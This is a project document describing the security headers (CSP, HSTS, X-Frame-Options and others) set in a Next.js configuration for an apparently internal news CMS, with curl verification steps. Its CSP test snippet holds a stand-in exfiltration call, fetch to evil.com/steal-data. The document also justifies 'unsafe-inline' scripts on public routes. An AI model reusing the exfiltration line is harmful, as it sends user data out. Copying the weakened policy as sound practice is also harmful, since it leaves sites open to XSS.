# 🛡️ Security Headers Configuration

**Status:** ✅ IMPLEMENTED  
**Location:** `next.config.mjs`  
**Date:** 2026-05-06

---

## Headers Applied to All Routes (Except Admin & API)

```
Content-Security-Policy: Blocks XSS, clickjacking, unsafe scripts
X-Frame-Options: DENY (prevent clickjacking)
X-Content-Type-Options: nosniff (prevent MIME sniffing)
X-XSS-Protection: 1; mode=block (legacy XSS protection)
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: Denies camera, mic, geolocation
Strict-Transport-Security: max-age=31536000 (HSTS, force HTTPS)
```

---

## Content-Security-Policy Details

**Policy:**
```
default-src 'self';                          # Only self by default
script-src 'self' 'unsafe-inline' *.googletagmanager.com *.google-analytics.com;  # Allow GTM & GA4
style-src 'self' 'unsafe-inline';            # Allow inline styles (Tailwind)
img-src 'self' data: https:;                 # Allow images from self, data URIs, HTTPS
font-src 'self' data:;                       # Allow fonts from self & data URIs
connect-src 'self' *.google-analytics.com;   # Allow API calls to GA4
frame-ancestors 'none';                      # Cannot be embedded in iframes
base-uri 'self';                             # Restrict base URL
form-action 'self';                          # Forms can only submit to self
```

**Why `unsafe-inline`?**
- Next.js & Tailwind require inline styles for development
- Production should consider nonce-based CSP instead
- This is acceptable for internal admin panels

---

## Verification

### Test Security Headers
```bash
curl -I https://news-ai-cms.example.com
```

**Expected output:**
```
HTTP/2 200
content-security-policy: default-src 'self'; script-src...
x-frame-options: DENY
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
referrer-policy: strict-origin-when-cross-origin
permissions-policy: camera=(), microphone=(), geolocation=()
strict-transport-security: max-age=31536000; includeSubDomains; preload
```

### Test CSP Violation
```html
<script>
  // This should be blocked by CSP
  fetch('https://evil.com/steal-data');
</script>
```

Expected: Script blocked, warning in browser console.

---

## Admin & API Routes (CSP Not Applied)

Routes matching `/(admin|api)` do NOT receive the CSP header because:
- Admin panel (Payload CMS) may use inline scripts
- API routes should return JSON, not HTML

---

## HSTS Preload

Current HSTS header includes `preload` directive:
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

To activate HSTS preload:
1. Ensure HTTPS works for all subdomains
2. Visit https://hstspreload.org/
3. Submit your domain
4. Monitor for any issues (can take 6+ months to propagate)

---

## Future Improvements (Phase 2)

- [ ] Use nonce-based CSP for tighter security
- [ ] Implement Subresource Integrity (SRI) for CDN resources
- [ ] Add Report-Only CSP header for monitoring violations
- [ ] Set up CSP violation reporting endpoint

---

## References

- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN: X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [OWASP: Security Headers](https://owasp.org/www-project-secure-headers/)

---

*Week 1: Wednesday-Thursday Deliverable*  
*See IMPLEMENTATION_PLAN.md for full timeline*
